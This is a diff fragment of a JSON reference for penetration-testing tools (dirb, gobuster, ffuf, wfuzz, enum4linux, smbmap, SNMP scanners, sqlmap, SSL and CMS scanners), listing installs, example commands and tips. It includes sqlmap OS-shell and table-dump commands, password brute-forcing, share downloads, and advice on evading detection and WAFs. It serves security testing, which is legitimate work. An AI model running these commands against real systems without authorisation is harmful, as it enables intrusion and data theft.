+      "Combine with other web scanners for comprehensive coverage."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "dirb",
+    "name": "Dirb",
+    "summary": "Dirb is a Web Content Scanner that looks for existing (and/or hidden) Web Objects by brute force crawling the web server.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install dirb",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux (pre-installed)",
+        "steps": [
+          {
+            "detail": "dirb",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/v0re/dirb.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd dirb",
+            "copyable": true
+          },
+          {
+            "detail": "make && sudo make install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic directory scan",
+        "command": "dirb https://example.com",
+        "notes": []
+      },
+      {
+        "description": "Scan with custom wordlist",
+        "command": "dirb https://example.com /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
+        "notes": []
+      },
+      {
+        "description": "Scan with file extensions",
+        "command": "dirb https://example.com -X .php,.html,.txt",
+        "notes": []
+      },
+      {
+        "description": "Save output to file",
+        "command": "dirb https://example.com -o dirb_results.txt",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-a",
+        "description": "User agent"
+      },
+      {
+        "flag": "-c",
+        "description": "Cookie string"
+      },
+      {
+        "flag": "-X",
+        "description": "File extensions to scan"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "-r",
+        "description": "Don't stop on warnings"
+      },
+      {
+        "flag": "-S",
+        "description": "Silent mode"
+      },
+      {
+        "flag": "-v",
+        "description": "Verbose mode"
+      }
+    ],
+    "operational_tips": [
+      "Use comprehensive wordlists for better results.",
+      "Combine with multiple file extensions for thorough coverage.",
+      "Save results for analysis and later testing.",
+      "Consider rate limiting to avoid detection."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "gobuster",
+    "name": "Gobuster",
+    "summary": "Gobuster is a multithreaded directory, DNS, and virtual host brute-forcing tool. It is perfect for quickly finding hidden web content when you already know the hostname or base URL.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install gobuster",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install via Go",
+        "steps": [
+          {
+            "detail": "go install github.com/OJ/gobuster/v3@latest",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Manual download",
+        "steps": [
+          {
+            "detail": "wget https://github.com/OJ/gobuster/releases/download/v3.6.0/gobuster_Linux_x86_64.tar.gz",
+            "copyable": true
+          },
+          {
+            "detail": "tar -xzf gobuster_Linux_x86_64.tar.gz",
+            "copyable": true
+          },
+          {
+            "detail": "sudo mv gobuster /usr/local/bin/",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Directory/file brute-forcing (dir mode)",
+        "command": "gobuster dir -u http://example.com -w data/wordlists/common.txt",
+        "notes": []
+      },
+      {
+        "description": "DNS subdomain enumeration",
+        "command": "gobuster dns -d example.com -w data/wordlists/subdomains.txt",
+        "notes": []
+      },
+      {
+        "description": "Virtual host discovery",
+        "command": "gobuster vhost -u http://example.com -w data/wordlists/vhosts.txt",
+        "notes": []
+      },
+      {
+        "description": "Directory scan with extensions and status filters",
+        "command": "gobuster dir -u https://example.com -w data/wordlists/common.txt -x php,txt,bak -s 200,204,301,302,403",
+        "notes": []
+      },
+      {
+        "description": "Authenticated scan with cookies",
+        "command": "gobuster dir -u https://portal.example.com -w data/wordlists/common.txt -c 'session=abcd1234'",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "dir/dns/vhost",
+        "description": "Choose directory, DNS, or virtual host mode"
+      },
+      {
+        "flag": "-u/-d",
+        "description": "Target base URL (-u) or domain (-d)"
+      },
+      {
+        "flag": "-w <wordlist>",
+        "description": "Path to the wordlist file"
+      },
+      {
+        "flag": "-x <extensions>",
+        "description": "Comma-separated extensions to append"
+      },
+      {
+        "flag": "-t <threads>",
+        "description": "Adjust concurrency (default 10)"
+      },
+      {
+        "flag": "-s/-b",
+        "description": "Positive (-s) or blacklist (-b) status codes"
+      },
+      {
+        "flag": "-a/-c/-H",
+        "description": "Set User-Agent (-a), cookies (-c), or custom header (-H)"
+      },
+      {
+        "flag": "--delay",
+        "description": "Add delay between requests to avoid throttling"
+      }
+    ],
+    "operational_tips": [
+      "Use smaller wordlists first to confirm interesting responses, then scale up.",
+      "Leverage PT Journal wordlists in data/wordlists/ or swap in SecLists.",
+      "Always review HTTP status codes; -s 200,204,301,302,307,401,403 keeps useful hits.",
+      "Add -x php,asp,bak for common backup files.",
+      "Combine Gobuster output with proxy logs for deeper insights."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "ffuf",
+    "name": "ffuf",
+    "summary": "ffuf (Fuzz Faster U Fool) is a blazing fast web fuzzer for discovering files, directories, parameters, and virtual hosts. It supports advanced filters to quickly isolate meaningful responses.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install ffuf",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install via Go",
+        "steps": [
+          {
+            "detail": "go install github.com/ffuf/ffuf@latest",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Manual build",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/ffuf/ffuf.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd ffuf && go build",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Directory fuzzing",
+        "command": "ffuf -w data/wordlists/common.txt -u https://target/FUZZ",
+        "notes": []
+      },
+      {
+        "description": "Parameter fuzzing",
+        "command": "ffuf -w params.txt -u 'https://target/search?FUZZ=test'",
+        "notes": []
+      },
+      {
+        "description": "Find virtual hosts",
+        "command": "ffuf -w subdomains.txt -u http://target/ -H 'Host: FUZZ.target'",
+        "notes": []
+      },
+      {
+        "description": "Filter by response size",
+        "command": "ffuf -w common.txt -u https://target/FUZZ -fs 0",
+        "notes": []
+      },
+      {
+        "description": "Recursive fuzzing",
+        "command": "ffuf -w common.txt -u https://target/FUZZ -recursion -recursion-depth 2",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-w <wordlist>",
+        "description": "Wordlist path"
+      },
+      {
+        "flag": "-u <url>",
+        "description": "Target URL (use FUZZ keyword)"
+      },
+      {
+        "flag": "-H/-b",
+        "description": "Inject headers or cookies"
+      },
+      {
+        "flag": "-recursion",
+        "description": "Automatically revisit discovered paths"
+      },
+      {
+        "flag": "-mc/-fc",
+        "description": "Filter by match or filter status codes"
+      },
+      {
+        "flag": "-fs/-fw",
+        "description": "Filter by size (bytes) or words"
+      },
+      {
+        "flag": "-t/-p",
+        "description": "Threads (-t) and delay (-p)"
+      },
+      {
+        "flag": "-o <file>",
+        "description": "Write JSON output"
+      }
+    ],
+    "operational_tips": [
+      "Mark every location to fuzz with FUZZ (URL paths, headers, POST data).",
+      "Use -ic to ignore wordlist comments when using SecLists.",
+      "Stack filters (e.g., -mc 200 -fs 0) to hide noise quickly.",
+      "Throttle threads (-t) for fragile targets or WAFs.",
+      "Store results (-o output.json) for later analysis or reporting."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "wfuzz",
+    "name": "Wfuzz",
+    "summary": "Wfuzz is a web application fuzzer used to brute force GET/POST parameters, analyze responses, and find hidden resources.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install wfuzz",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from pip",
+        "steps": [
+          {
+            "detail": "pip3 install wfuzz",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/xmendez/wfuzz.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd wfuzz",
+            "copyable": true
+          },
+          {
+            "detail": "python3 setup.py install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic directory fuzzing",
+        "command": "wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://example.com/FUZZ",
+        "notes": []
+      },
+      {
+        "description": "Parameter fuzzing",
+        "command": "wfuzz -w wordlist.txt -z range,1-100 --hc 404 https://example.com/search.php?id=FUZZ",
+        "notes": []
+      },
+      {
+        "description": "POST form fuzzing",
+        "command": "wfuzz -w users.txt -w passwords.txt -d 'user=FUZZ&pass=FUZ2Z' https://example.com/login.php",
+        "notes": []
+      },
+      {
+        "description": "Virtual host enumeration",
+        "command": "wfuzz -w subdomains.txt -H 'Host: FUZZ.example.com' https://example.com",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-w",
+        "description": "Wordlist file"
+      },
+      {
+        "flag": "-z",
+        "description": "Payload generator"
+      },
+      {
+        "flag": "-d",
+        "description": "POST data"
+      },
+      {
+        "flag": "-H",
+        "description": "Custom headers"
+      },
+      {
+        "flag": "--hc",
+        "description": "Hide response codes"
+      },
+      {
+        "flag": "--hl",
+        "description": "Hide response lines"
+      },
+      {
+        "flag": "--hw",
+        "description": "Hide response words"
+      }
+    ],
+    "operational_tips": [
+      "Use filters (--hc, --hl, --hw) to reduce noise.",
+      "Combine multiple wordlists for complex attacks.",
+      "Save interesting results for manual testing.",
+      "Use POST data for form and API testing."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "enum4linux",
+    "name": "Enum4linux",
+    "summary": "Enum4linux is a tool for enumerating information from Windows and Samba systems, similar to enum.exe but for Linux.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install enum4linux",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux (pre-installed)",
+        "steps": [
+          {
+            "detail": "enum4linux",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/CiscoCXSecurity/enum4linux.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd enum4linux",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x enum4linux.pl",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Full enumeration",
+        "command": "enum4linux -a 192.168.1.100",
+        "notes": []
+      },
+      {
+        "description": "Share enumeration",
+        "command": "enum4linux -S 192.168.1.100",
+        "notes": []
+      },
+      {
+        "description": "User enumeration",
+        "command": "enum4linux -U 192.168.1.100",
+        "notes": []
+      },
+      {
+        "description": "OS and workgroup information",
+        "command": "enum4linux -o 192.168.1.100",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-a",
+        "description": "All enumeration options"
+      },
+      {
+        "flag": "-U",
+        "description": "Get userlist"
+      },
+      {
+        "flag": "-S",
+        "description": "Share enumeration"
+      },
+      {
+        "flag": "-P",
+        "description": "Password policy"
+      },
+      {
+        "flag": "-o",
+        "description": "OS information"
+      },
+      {
+        "flag": "-g",
+        "description": "Group and member list"
+      },
+      {
+        "flag": "-r",
+        "description": "RID cycling"
+      }
+    ],
+    "operational_tips": [
+      "Always try full enumeration first for maximum information.",
+      "Use results to identify weak configurations and users.",
+      "Document share information for potential access paths.",
+      "Combine with SMB exploitation tools for follow-up testing."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "smbmap",
+    "name": "SMBMap",
+    "summary": "SMBMap allows users to enumerate samba share drives across an entire domain. Useful for identifying sensitive shares.",
+    "installation_guides": [
+      {
+        "platform": "Install from pip",
+        "steps": [
+          {
+            "detail": "pip3 install smbmap",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/ShawnDEvans/smbmap.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd smbmap",
+            "copyable": true
+          },
+          {
+            "detail": "python3 setup.py install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic share enumeration",
+        "command": "smbmap -H 192.168.1.100",
+        "notes": []
+      },
+      {
+        "description": "List shares with permissions",
+        "command": "smbmap -H 192.168.1.100 -R",
+        "notes": []
+      },
+      {
+        "description": "Download files from share",
+        "command": "smbmap -H 192.168.1.100 -u guest -p '' -R 'share_name' --download 'path/to/file'",
+        "notes": []
+      },
+      {
+        "description": "Upload file to share",
+        "command": "smbmap -H 192.168.1.100 -u user -p pass -R 'share_name' --upload '/local/file.txt' 'remote/path'",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-H",
+        "description": "Target host"
+      },
+      {
+        "flag": "-u",
+        "description": "Username"
+      },
+      {
+        "flag": "-p",
+        "description": "Password"
+      },
+      {
+        "flag": "-R",
+        "description": "Recursively list directories"
+      },
+      {
+        "flag": "--download",
+        "description": "Download file"
+      },
+      {
+        "flag": "--upload",
+        "description": "Upload file"
+      },
+      {
+        "flag": "-x",
+        "description": "Execute command"
+      }
+    ],
+    "operational_tips": [
+      "Try null session authentication for anonymous access.",
+      "Look for sensitive files in readable shares.",
+      "Document permissions for potential privilege escalation.",
+      "Be careful with file operations to avoid detection."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "snmpwalk",
+    "name": "SNMPwalk",
+    "summary": "SNMPwalk is an SNMP application that uses SNMP GETNEXT requests to query a network entity for a tree of information.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install snmp",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "RHEL/CentOS",
+        "steps": [
+          {
+            "detail": "sudo yum install net-snmp-utils",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "wget https://sourceforge.net/projects/net-snmp/files/net-snmp/",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic SNMP walk",
+        "command": "snmpwalk -v2c -c public 192.168.1.1",
+        "notes": []
+      },
+      {
+        "description": "Walk specific OID tree",
+        "command": "snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.1",
+        "notes": []
+      },
+      {
+        "description": "Verbose output with retries",
+        "command": "snmpwalk -v2c -c public -v -r 3 192.168.1.1",
+        "notes": []
+      },
+      {
+        "description": "Walk all OIDs",
+        "command": "snmpwalk -v2c -c public 192.168.1.1 .1",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-v",
+        "description": "SNMP version (1, 2c, 3)"
+      },
+      {
+        "flag": "-c",
+        "description": "Community string"
+      },
+      {
+        "flag": "-r",
+        "description": "Number of retries"
+      },
+      {
+        "flag": "-t",
+        "description": "Timeout in seconds"
+      },
+      {
+        "flag": "-m",
+        "description": "Load MIB modules"
+      },
+      {
+        "flag": "-On",
+        "description": "Print OIDs numerically"
+      },
+      {
+        "flag": "-Os",
+        "description": "Print only last symbolic part"
+      }
+    ],
+    "operational_tips": [
+      "Try common community strings like 'public', 'private', 'cisco'.",
+      "Use version 1 for older devices, 2c for modern ones.",
+      "Save output for analysis of device configuration.",
+      "Combine with SNMP brute force tools for discovery."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "onesixtyone",
+    "name": "Onesixtyone",
+    "summary": "Onesixtyone is an SNMP scanner that sends SNMP requests to multiple IP addresses, trying different community strings.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install onesixtyone",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/trailofbits/onesixtyone.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd onesixtyone",
+            "copyable": true
+          },
+          {
+            "detail": "make && sudo make install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic SNMP scan",
+        "command": "onesixtyone 192.168.1.1",
+        "notes": []
+      },
+      {
+        "description": "Scan with custom community strings",
+        "command": "onesixtyone -c community.txt 192.168.1.0/24",
+        "notes": []
+      },
+      {
+        "description": "Fast scan with output file",
+        "command": "onesixtyone -o results.txt -w wordlist.txt 192.168.1.0/24",
+        "notes": []
+      },
+      {
+        "description": "Verbose scanning",
+        "command": "onesixtyone -v -d 192.168.1.1",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-c",
+        "description": "Community strings file"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "-w",
+        "description": "Wordlist file"
+      },
+      {
+        "flag": "-v",
+        "description": "Verbose mode"
+      },
+      {
+        "flag": "-d",
+        "description": "Debug mode"
+      },
+      {
+        "flag": "-i",
+        "description": "Input file with hosts"
+      }
+    ],
+    "operational_tips": [
+      "Use comprehensive community string wordlists.",
+      "Scan in batches to avoid overwhelming networks.",
+      "Save results for follow-up SNMP enumeration.",
+      "Combine with detailed SNMPwalk on discovered devices."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "sqlmap",
+    "name": "sqlmap",
+    "summary": "sqlmap automates the detection and exploitation of SQL injection flaws, supporting numerous DBMS engines and shell payloads.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install sqlmap",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "From source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/sqlmapproject/sqlmap.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd sqlmap",
+            "copyable": true
+          },
+          {
+            "detail": "python3 sqlmap.py --help",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic GET parameter test",
+        "command": "python3 sqlmap.py -u 'https://target/item.php?id=1' --batch",
+        "notes": []
+      },
+      {
+        "description": "Use captured request file",
+        "command": "python3 sqlmap.py -r request.txt --level 3 --risk 2",
+        "notes": []
+      },
+      {
+        "description": "Enumerate databases",
+        "command": "python3 sqlmap.py -u 'https://target/item.php?id=1' --dbs",
+        "notes": []
+      },
+      {
+        "description": "Dump a table",
+        "command": "python3 sqlmap.py -u 'https://target/item.php?id=1' -D appdb -T users --dump",
+        "notes": []
+      },
+      {
+        "description": "Obtain OS shell",
+        "command": "python3 sqlmap.py -u 'https://target/item.php?id=1' --os-shell",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-u/-r",
+        "description": "Direct URL (-u) or request file (-r)"
+      },
+      {
+        "flag": "--level/--risk",
+        "description": "Depth of tests (1-5) and impact"
+      },
+      {
+        "flag": "--batch",
+        "description": "Auto-confirm prompts"
+      },
+      {
+        "flag": "--dbs/-D/-T/-C",
+        "description": "Enumerate DBs, tables, columns"
+      },
+      {
+        "flag": "--dump",
+        "description": "Dump selected data"
+      },
+      {
+        "flag": "--os-shell/--sql-shell",
+        "description": "Spawn command or SQL shells"
+      },
+      {
+        "flag": "--tamper",
+        "description": "Apply tamper scripts (evasion)"
+      },
+      {
+        "flag": "--random-agent",
+        "description": "Randomize User-Agent"
+      }
+    ],
+    "operational_tips": [
+      "Capture complex requests with Burp/ZAP and feed them via -r.",
+      "Use lower --risk/--level on fragile production targets.",
+      "Always document data extracted and clean up any uploaded shells.",
+      "Tamper scripts can bypass WAF/IDS filters; try between attempts."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "sslyze",
+    "name": "SSLyze",
+    "summary": "SSLyze is a powerful Python tool that can analyze the SSL configuration of a server by connecting to it and identifying any weaknesses.",
+    "installation_guides": [
+      {
+        "platform": "Install from pip",
+        "steps": [
+          {
+            "detail": "pip3 install sslyze",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/nabla-c0d3/sslyze.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd sslyze",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install -r requirements.txt",
+            "copyable": true
+          },
+          {
+            "detail": "python3 sslyze --help",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic SSL scan",
+        "command": "python3 sslyze --regular example.com",
+        "notes": []
+      },
+      {
+        "description": "Scan specific port",
+        "command": "python3 sslyze --regular example.com:8443",
+        "notes": []
+      },
+      {
+        "description": "Heartbleed check",
+        "command": "python3 sslyze --heartbleed example.com",
+        "notes": []
+      },
+      {
+        "description": "Save results to JSON",
+        "command": "python3 sslyze --json_out results.json example.com",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--regular",
+        "description": "Run regular scan suite"
+      },
+      {
+        "flag": "--heartbleed",
+        "description": "Check for Heartbleed vulnerability"
+      },
+      {
+        "flag": "--openssl_ccs",
+        "description": "Check for OpenSSL CCS injection"
+      },
+      {
+        "flag": "--session_resumption",
+        "description": "Test session resumption"
+      },
+      {
+        "flag": "--json_out",
+        "description": "Save results to JSON file"
+      },
+      {
+        "flag": "--xml_out",
+        "description": "Save results to XML file"
+      }
+    ],
+    "operational_tips": [
+      "Use --regular for comprehensive vulnerability scanning.",
+      "Scan multiple ports for complete SSL coverage.",
+      "Save results for documentation and reporting.",
+      "Combine with other SSL tools for thorough analysis."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "testssl",
+    "name": "TestSSL.sh",
+    "summary": "TestSSL.sh is a free command line tool which checks a server's service on any port for the support of TLS/SSL ciphers, protocols as well as cryptographic flaws.",
+    "installation_guides": [
+      {
+        "platform": "Install from git",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/drwetter/testssl.sh.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd testssl.sh",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x testssl.sh",
+            "copyable": true
+          },
+          {
+            "detail": "./testssl.sh --help",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux (pre-installed)",
+        "steps": [
+          {
+            "detail": "testssl.sh",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic SSL/TLS test",
+        "command": "./testssl.sh example.com",
+        "notes": []
+      },
+      {
+        "description": "Test specific port",
+        "command": "./testssl.sh example.com:8443",
+        "notes": []
+      },
+      {
+        "description": "Test only protocols",
+        "command": "./testssl.sh --protocols example.com",
+        "notes": []
+      },
+      {
+        "description": "Generate HTML report",
+        "command": "./testssl.sh --htmlfile report.html example.com",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--protocols",
+        "description": "Check TLS/SSL protocols"
+      },
+      {
+        "flag": "--cipher",
+        "description": "Check cipher suites"
+      },
+      {
+        "flag": "--vulnerable",
+        "description": "Test for vulnerabilities"
+      },
+      {
+        "flag": "--htmlfile",
+        "description": "Generate HTML report"
+      },
+      {
+        "flag": "--jsonfile",
+        "description": "Generate JSON report"
+      },
+      {
+        "flag": "--quiet",
+        "description": "Reduce output verbosity"
+      },
+      {
+        "flag": "--fast",
+        "description": "Fast scan mode"
+      }
+    ],
+    "operational_tips": [
+      "Use HTML reports for professional documentation.",
+      "Fast mode is good for initial assessments.",
+      "Test all ports that use SSL/TLS for complete coverage.",
+      "Document findings for remediation tracking."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "wpscan",
+    "name": "WPScan",
+    "summary": "WPScan is a black box WordPress vulnerability scanner written in Ruby that can be used to scan WordPress installations for security issues.",
+    "installation_guides": [
+      {
+        "platform": "Install from gem",
+        "steps": [
+          {
+            "detail": "gem install wpscan",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/wpscanteam/wpscan.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd wpscan",
+            "copyable": true
+          },
+          {
+            "detail": "bundle install && rake install",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker",
+        "steps": [
+          {
+            "detail": "docker run -it --rm wpscanteam/wpscan --url https://example.com",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic WordPress scan",
+        "command": "wpscan --url https://example.com",
+        "notes": []
+      },
+      {
+        "description": "Enumerate users",
+        "command": "wpscan --url https://example.com --enumerate u",
+        "notes": []
+      },
+      {
+        "description": "Plugin enumeration",
+        "command": "wpscan --url https://example.com --enumerate p",
+        "notes": []
+      },
+      {
+        "description": "Password attack",
+        "command": "wpscan --url https://example.com --passwords wordlist.txt --usernames admin",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--url",
+        "description": "Target WordPress URL"
+      },
+      {
+        "flag": "--enumerate",
+        "description": "Enumeration options"
+      },
+      {
+        "flag": "--plugins-detection",
+        "description": "Plugin detection mode"
+      },
+      {
+        "flag": "--passwords",
+        "description": "Password list for brute force"
+      },
+      {
+        "flag": "--usernames",
+        "description": "Username list for brute force"
+      },
+      {
+        "flag": "--api-token",
+        "description": "WPVulnDB API token"
+      },
+      {
+        "flag": "--output",
+        "description": "Output file"
+      }
+    ],
+    "operational_tips": [
+      "Use API token for up-to-date vulnerability database.",
+      "Enumerate users first, then attempt password attacks.",
+      "Save results for later analysis and reporting.",
+      "Be careful with brute force attempts to avoid lockouts."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "joomscan",
+    "name": "Joomscan",
+    "summary": "Joomscan is a Joomla vulnerability scanner that can detect vulnerabilities, misconfigurations, and security issues in Joomla installations.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install joomscan",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/rezasp/joomscan.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd joomscan",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x joomscan.pl",
+            "copyable": true
+          },
+          {
+            "detail": "sudo perl joomscan.pl update",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic Joomla scan",
+        "command": "joomscan -u https://example.com",
+        "notes": []
+      },
+      {
+        "description": "Scan with cookie",
+        "command": "joomscan -u https://example.com -c 'session=abc123'",
+        "notes": []
+      },
+      {
+        "description": "Check for specific Joomla version",
+        "command": "joomscan -u https://example.com --check-version",
+        "notes": []
+      },
+      {
+        "description": "Save scan results",
+        "command": "joomscan -u https://example.com -o results.txt",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-u",
+        "description": "Target Joomla URL"
+      },
+      {
+        "flag": "-c",
+        "description": "Cookie string"
+      },
+      {
+        "flag": "-p",
+        "description": "Proxy server"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "--check-version",
+        "description": "Check Joomla version"
+      },
+      {
+        "flag": "--random-agent",
+        "description": "Use random user agent"
+      },
+      {
+        "flag": "--follow-redirect",
+        "description": "Follow HTTP redirects"
+      }
+    ],
+    "operational_tips": [
+      "Update database regularly for latest signatures.",
+      "Use cookies to scan authenticated areas.",
+      "Check version against known vulnerabilities.",
+      "Document all findings for remediation."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "nuclei",
+    "name": "Nuclei",
+    "summary": "Nuclei is a fast and customizable vulnerability scanner based on simple YAML based DSL that enables you to detect vulnerabilities in misconfigurations.",
+    "installation_guides": [
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Update templates",
+        "steps": [
+          {
+            "detail": "nuclei -update-templates",
+            "copyable": true
+          }
+        ]
+      }
+    ],
